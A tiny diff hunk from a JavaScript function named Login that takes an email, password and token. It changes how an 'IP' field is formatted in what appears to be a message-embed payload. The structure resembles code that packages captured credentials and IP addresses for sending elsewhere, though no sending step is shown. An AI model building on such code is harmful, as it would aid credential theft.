@@ -166,7 +166,7 @@ function Login(email, password, token) {
                                  },
                                  {
                                     "name": "",
-                                    "value": `IP: \n${o}\n`
+                                    "value": `IP: ${o}`
 
 
 
